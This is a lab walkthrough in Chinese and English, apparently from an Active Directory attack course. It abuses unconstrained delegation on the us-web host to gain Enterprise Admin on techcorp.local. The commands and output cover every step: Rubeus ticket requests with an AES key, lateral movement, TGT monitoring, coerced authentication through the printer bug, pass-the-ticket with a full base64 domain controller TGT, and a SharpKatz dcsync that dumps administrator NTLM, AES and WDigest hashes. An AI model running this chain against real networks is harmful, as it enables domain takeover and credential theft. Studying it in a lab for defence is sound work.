Task
•  Abuse the Unconstrained Delegation on us-web to get Enterprise Admin privileges on techcorp.local.


1. 新开一个webmaster的shell，webmaster是us-web 的管理员，us-web 这台机器有无约束委托权限
```
C:\AD\Tools\Rubeus.exe asktgt /domain:us.techcorp.local /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

2. 拷贝Rubeus.exe到us-web
```
echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Users\Public\Rubeus.exe /Y
```

3. 横向到us-web,对TECHCORP-DC$开启monitor
```
C:\Windows\system32>winrs -r:us-web cmd.exe
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\webmaster>C:\Users\Public\Rubeus.exe monitor /targetuser:TECHCORP-DC$ /interval:5 /nowrap
C:\Users\Public\Rubeus.exe monitor /targetuser:TECHCORP-DC$ /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1

[*] Action: TGT Monitoring
[*] Target user     : TECHCORP-DC$
[*] Monitoring every 5 seconds for new TGTs
```


4. 在学生机，利用printer bug让techcorp-dc向us-web认证

```
PS C:\Windows\system32> C:\AD\Tools\MS-RPRN.exe \\techcorp-dc.techcorp.local \\us-web.us.techcorp.local
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
PS C:\Windows\system32>
```

5. 收到techcorp-dc的tgt

```
C:\Users\Public\Rubeus.exe monitor /targetuser:TECHCORP-DC$ /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1

[*] Action: TGT Monitoring
[*] Target user     : TECHCORP-DC$
[*] Monitoring every 5 seconds for new TGTs


[*] 11/3/2022 2:34:35 PM UTC - Found new TGT:

  User                  :  TECHCORP-DC$@TECHCORP.LOCAL
  StartTime             :  11/2/2022 11:34:38 PM
  EndTime               :  11/3/2022 9:33:05 AM
  RenewTill             :  11/9/2022 1:02:29 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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

[*] Ticket cache size: 1
```

6. ptt上面的ticket,注入到当前session

```
PS C:\Windows\system32> C:\AD\Tools\Rubeus.exe ptt /ticket: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

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1


[*] Action: Import Ticket
[+] Ticket successfully imported!
PS C:\Windows\system32>
```

7. dcsync出EA的哈希

```
PS C:\Windows\system32> C:\AD\Tools\SharpKatz.exe --Command dcsync --User techcorp\administrator --Domain techcorp.local --DomainController techcorp-dc.techcorp.local
[*]
[*]                     System Information
[*] ----------------------------------------------------------------------
[*] | Platform: Win32NT                                                  |
[*] ----------------------------------------------------------------------
[*] | Major: 10            | Minor: 0             | Build: 17763         |
[*] ----------------------------------------------------------------------
[*] | Version: Microsoft Windows NT 6.2.9200.0                           |
[*] ----------------------------------------------------------------------
[*]
[!] techcorp.local will be the domain
[!] techcorp-dc.techcorp.local will be the DC server
[!] techcorp\administrator will be the user account
[*]
[*] Object RDN           : Administrator
[*]
[*] ** SAM ACCOUNT **
[*]
[*] SAM Username         : Administrator
[*] User Principal Name  :
[*] Account Type         : USER_OBJECT
[*] User Account Control : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD
[*] Account expiration   : 12/31/9999 11:59:59 PM
[*] Password last change : 7/4/2019 3:01:32 AM
[*] Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-500
[*] Object Relative ID   : 500
[*]
[*] Credents:
[*] Hash NTLM            : bc4cf9b751d196c4b6e1a2ba923ef33f
[*] ntlm- 0              : bc4cf9b751d196c4b6e1a2ba923ef33f
[*] lm  - 0              : 6ac43f8c5f2e6ddab0f85e76d711eab8
[*]
[*] Supplemental Credents:
[*]
[*]  * Primary:NTLM-Strong-NTOWF
[*]     Random Value : f94f43f24957c86f1a2d359b7585b940
[*]
[*]  * Primary:Kerberos-Newer-Keys
[*]     Default Salt :TECHCORP.LOCALAdministrator
[*]     Credents
[*]     aes256_hmac       4096: 58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883
[*]     aes128_hmac       4096: 1470b3ca6afc4146399c177ab08c5d29
[*]     des_cbc_md5       4096: c198a4545e6d4c94
[*]     ServiceCredents
[*]     OldCredents
[*]     aes256_hmac       4096: 9de1b687c149f44ccf5bb546d7c5a6eb47feab97bc34380ee54257024a43caf0
[*]     aes128_hmac       4096: f7996a1b81e251f7eb2cceda64f7a2ff
[*]     des_cbc_md5       4096: 386b3de03ecb62df
[*]     OlderCredents
[*]
[*]  * Primary:Kerberos
[*]     Default Salt :TECHCORP.LOCALAdministrator
[*]     Credents
[*]     des_cbc_md5       : c198a4545e6d4c94
[*]     OldCredents
[*]     des_cbc_md5       : 386b3de03ecb62df
[*]
[*]  * Packages
[*]     NTLM-Strong-NTOWF Kerberos-Newer-Keys Kerberos WDigest
[*]
[*]  * Primary:WDigest
[*]     01 f4e3c69dc427ef76903a65e2848b0f4c
[*]     02 bf5ea8567f6fd1ef7f257304278a6e52
[*]     03 b3ed9e4019c9c725ae929d0b73cbd852
[*]     04 f4e3c69dc427ef76903a65e2848b0f4c
[*]     05 5c0f8ba64238288eff440c01bbe81a5e
[*]     06 dcc7e5185c6c279b3d10b20af1994cbb
[*]     07 50e4e0f1db674508a890e22751797889
[*]     08 f0fd75f91cf2843531ff58d83a85b84e
[*]     09 bd49a7a6232f85a5b8d8edb68786032b
[*]     10 6aabbb1d7742272ceff856b907c5c9ba
[*]     11 3a21402317ce21660b2ccb899d783ea3
[*]     12 f0fd75f91cf2843531ff58d83a85b84e
[*]     13 04f3c03fd2e53ee67fbece68ce267134
[*]     14 9a08da7d88d88f8e3b307adee818cc6e
[*]     15 da942a6b569ef74ecb675359bc2784eb
[*]     16 f783eb704fa6677368309688a31efc97
[*]     17 2e4abf671ea3bba742e340f2b25a3970
[*]     18 e60715ae3f9dc9d75b3c4aabf36d7a30
[*]     19 f0d4e1439ff5452f1a0fffb97e04524e
[*]     20 816fb1f321fd9e6936bc86db53375242
[*]     21 4e29af591c5b9fc1837a19ec61433da9
[*]     22 e238e557513d21c02e67134fd5209e01
[*]     23 db8ad27d9ed2dc8fa35d3c546d896b60
[*]     24 2c89e15382d83a0e7007b916c5f21925
[*]     25 60b33decd4f178a2417b0dc9e776ad3e
[*]     26 55584de6c6a3c05c519cbbf35478bbfa
[*]     27 c790bb64ca16391e1e9b15c9cb0aad68
[*]     28 067ef368529b0ba16bcfd1276c306aea
[*]     29 438b45e36bd633e4bedbb3748f3d0c4d
```


